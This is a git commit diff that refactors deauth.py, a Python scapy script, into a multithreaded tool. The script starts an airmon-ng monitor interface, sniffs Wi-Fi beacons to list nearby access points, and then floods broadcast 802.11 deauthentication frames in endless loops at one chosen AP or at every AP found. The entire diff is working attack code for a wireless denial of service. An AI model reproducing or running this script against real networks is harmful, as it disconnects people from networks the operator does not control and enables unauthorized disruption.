47bd774468f6198841f55efb5c867614247ccd3b
Veerendra <veerendra2@users.noreply.github.com>
2016-12-07 16:59:08 +0530

    OOPS, Multithreaded
    1) Implemeted in OOPS
    2) Implemented multithreading to deauth packets for multiple APs at a time

--- deauth.py
+++ deauth.py
@@ -1,71 +1,118 @@
-import sys
-import subprocess
+#!/usr/bin/python
 import os
+import scapy.all
+import threading
+import sys
+import re
 
-ap_list = dict()
-pktcount=0
-ssidcount=0
+class airmon(object):
+    def __new__(cls, *args,**kwargs):
+        mon_interface=list()
+        with open("/proc/net/dev","r") as f:
+            for line in f.readlines():
+                if re.search(r'mon[0-9]+',line):
+                    print "Found airmon-ng interface..",line.split(":")[0].strip()
+                    mon_interface.append(line.split(":")[0].strip())
+        if not mon_interface:
+            print "Starting monitoring interface on the wlan0..."
+            if os.system("airmon-ng start wlan0")!=0:
+                print "airmon-ng not found. Please install aircrack-ng. RUN 'sudo apt-get install aircrack-ng -y'"
+                raise SystemExit() #Instance creation Aborted!
+            mon_interface.append("mon0")
+        new_instance=object.__new__(cls,*args,**kwargs)
+        setattr(new_instance, "mon_interfaces",mon_interface)
+        return new_instance #returns the instance, if there is mon0 interface
 
-def execuitCommand(cmd):
-    return subprocess.call(cmd,shell=True)
+def spinning_cursor():
+    while True:
+        for cursor in '|/-\\':
+            yield cursor
 
-try:
-    from scapy.all import *
-except:
-    print "scapy module not found. So, installing... "
-    execuitCommand("apt-get install python-scapy")
+class sniffWifi(object):
+    def __new__(cls,*args,**kwargs):
+        mon=airmon() #Starting airmon-ng
+        return object.__new__(cls,*args,**kwargs) #returns the instance, if there is mon0 interface
 
-def startAirmon():
-    if execuitCommand("airmon-ng | grep mon0")==0:
-        print "Found mon0 Interface..."
-    else:
-        print "Starting monitoring interface on the wlan0..."
-        if execuitCommand("airmon-ng start wlan0")!=0:
-            print "airmon-ng not found. Please install aircrack-ng. RUN 'apt-get install aircrack-ng'"
-            sys.exit()
+    def __init__(self,pktlimit=2000):
+        self.ap_list = dict() #Key--> ssidcount, Value-->[MAC, SSID]
+        self.ap_set=set()
+        self.pktcount=0
+        self.ssidcount=0
+        self.pktlimit=pktlimit
+        self.test=spinning_cursor()
 
-def packetHandler(pkt):
-    global pktcount,ssidcount
-    pktcount+=1
-    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 not in ap_list :
-        ssidcount+=1
-        ap_list.setdefault(pkt.addr2,[ssidcount,pkt.info])
+    def packetHandler(self,pkt):
+        self.pktcount+=1
+        if pkt.haslayer(scapy.all.Dot11) and pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 not in self.ap_set:
+            self.ssidcount+=1
+            self.ap_set.add(pkt.addr2)
+            self.ap_list.setdefault(self.ssidcount,[pkt.addr2,pkt.info])
 
-def stopFilter(x): #Stop the Sniffing if packet reachs the count
-    global pktcount
-    if pktcount==10000:
-        return True
-    else:
-        return False
+    def stopFilter(self,x): #Stop the Sniffing if packet reachs the count
+        sys.stdout.write("\b{}".format(next(self.test)))
+        sys.stdout.flush()
+        if self.pktcount==self.pktlimit:
+            return True
+        else:
+            return False
 
-try:
-    input=os.environ["DEAUTH"]
-    startAirmon()
-except:
-    if len(sys.argv)==1:
-        startAirmon()
-        print "Sniffing wifi signals. Please wait....\n"
-        sniff(iface="mon0", prn = packetHandler, stop_filter=stopFilter)
-        print "Please choose SSID to send deauthentication packets"
-        ap=dict()
+    def runSniff(self): #Sniffing Here!
+        print "Sniffing wifi signals. Please wait.....",
+        scapy.all.sniff(iface="mon0", prn = self.packetHandler, stop_filter=self.stopFilter)
+
+class Deauth(threading.Thread):
+    def __init__(self,mac=None):
+        threading.Thread.__init__(self)
+        self.mac=mac
+        self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac,addr3=mac)/scapy.all.Dot11Deauth()
+
+    def run(self):
         while True:
-            for mac, ssid in ap_list.iteritems():
-                print str(ssid[0]).ljust(2," "),mac.ljust(20," "),ssid[1]
-                ap.setdefault(ssid[0],mac)
-            x=int(raw_input(">>"))
-            input=ap[x]
-            if x in ap:
-                break
+            print self.mac
+            scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2)
 
-    elif len(sys.argv)==2:
-        input=sys.argv[1]
-        startAirmon()
+if __name__=='__main__':
+    try:
+        input=os.environ["DEAUTH"] #Starting with Environmental variable
+        if re.search(r'(?:[0-9a-fA-F]:?){12}',os.environ["DEAUTH"]):
+            print "Got the MAC address from environmental variable!"
+            mon=airmon()
+            Deauth(input).start()
+        else:
+            print "Incorrect MAC address formate!"
+            raise ValueError
+    except: # Environmental variable was not set or MAC address was not in corrent format
+        if len(sys.argv)==1: # No command line argument
+            ap=dict()
+            sniff=sniffWifi()
+            sniff.runSniff()
+            print "\n\n","0".ljust(2," "),"Send deauth packets to every network given below"
+            while True:
+                for id, ssid in sniff.ap_list.iteritems():
+                    print str(id).ljust(2," "),ssid[0].ljust(20," "),ssid[1]
+                x=int(raw_input(">>"))
+                if x==0:
+                    for id,mac in sniff.ap_list.iteritems():
+                        Deauth(mac[0]).start() #Multi Threading Here
+                elif x in sniff.ap_list:
+                    Deauth(sniff.ap_list[x][0]).start()
+                else:
+                    print "Please enter valid option.\n"
 
-    elif len(sys.argv)>2:
-        print "Usage: sudo python deauth.py [MAC]"
-        sys.exit()
+        elif len(sys.argv)==2:
+            input=sys.argv[1]
+            if input=="all":
+                sniff=sniffWifi()
+                sniff.runSniff()
+                for id,mac in sniff.ap_list.iteritems():
+                    Deauth(mac[0]).start() #Multi Threading Here
+            elif re.search(r'(?:[0-9a-fA-F]:?){12}',input):
+                mon=airmon()
+                Deauth(input).start()
+            else:
+                print "Incorrect MAC address formate!\nUsage: sudo python deauth.py [MAC or all]"
+                sys.exit()
 
-pkt=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=input,addr3=input)/Dot11Deauth()
-
-while True:
-    sendp(pkt, iface="mon0",count=1, inter=.2)
+        elif len(sys.argv)>2:
+            print "Usage: sudo python deauth.py [MAC or all]"
+            sys.exit()
